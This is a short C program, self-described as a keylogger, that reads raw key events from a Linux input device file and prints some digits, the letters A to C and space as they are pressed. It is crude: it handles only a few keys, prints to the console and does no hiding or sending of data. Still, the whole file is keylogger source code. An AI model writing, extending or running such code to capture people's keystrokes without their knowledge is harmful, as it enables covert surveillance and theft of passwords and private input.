#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <event-file>\n", argv[0]);
        exit(-1);
    }

    printf("Keylogger active ...\n");

    int fd = open(argv[1], O_RDONLY, 0);

    printf("Opened file descripter: %d\n", fd);

    struct input_event ie;

    while(1)
    {
        read(fd, &ie, sizeof(ie));

        if(ie.type != EV_KEY)
            continue;

        if(ie.value != 1)
            continue;


        if (ie.code >= 2 && ie.code <= 10)
        {
            printf("%d\n", ie.code - 1);
        }
        else if(ie.code == 11)
        {
            printf("0");
        }
        else if(ie.code == KEY_A)
        {
            printf("A");
        }
        else if(ie.code == KEY_B)
        {
            printf("B");
        }
        else if(ie.code == KEY_C)
        {
            printf("C");
        }
        else if(ie.code == KEY_SPACE)
        {
            printf(" ");
        }
        else
        {
            printf("Unknown  key pressed: %d\n", ie.code);
        }
        fflush(stdout);
    }

    return 0;
}